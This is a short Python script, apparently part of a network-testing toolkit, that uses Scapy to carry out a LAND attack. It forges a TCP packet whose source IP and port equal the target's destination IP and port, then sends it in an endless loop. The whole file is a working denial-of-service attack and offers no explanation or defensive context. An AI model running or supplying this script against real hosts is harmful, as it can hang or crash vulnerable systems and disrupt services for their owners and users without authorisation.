from scapy.all import *
from scapy.all import IP, TCP
import settings
"""
LAND attack (same source ip/port)
"""

pkt = IP(src=settings.destination_ip,dst=settings.destination_ip)/TCP(sport=settings.destination_port, dport=settings.destination_port)

send(pkt, iface=settings.source_interface, loop=1)